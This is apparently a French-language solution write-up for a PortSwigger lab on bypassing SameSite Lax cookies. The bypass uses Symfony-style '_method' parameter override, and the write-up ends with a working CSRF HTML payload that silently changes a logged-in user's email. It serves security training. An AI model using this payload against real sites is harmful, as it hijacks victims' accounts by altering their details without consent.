# Lab

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

## Solution

Sur ce lab on peut changer nootre email via un formulaire POST et l'objectif est de changer l'adresse mail d'un utilisateur via CSRF.

En essayant de générer un payload CSRF classique, on se rend compte que les cookies ne sont pas passés à travers les requêtes POST.

On peut essayer de changer le verbe HTTP de la requête en GET pour voir si les cookies sont passés à travers la requête mais on a une réponse 405 Method Not Allowed.

Sur certains frameworks dont Symfony, on peut spécifier le verbe en utilisant le query param `_method`.

```html
<html>
    <body>
        <script>
            document.location = 'https://0a3300dd034337df807d8179000a00b7.web-security-academy.net/my-account/change-email?email=pwned@mail.net&_method=POST';
        </script>
    </body>
</html>
```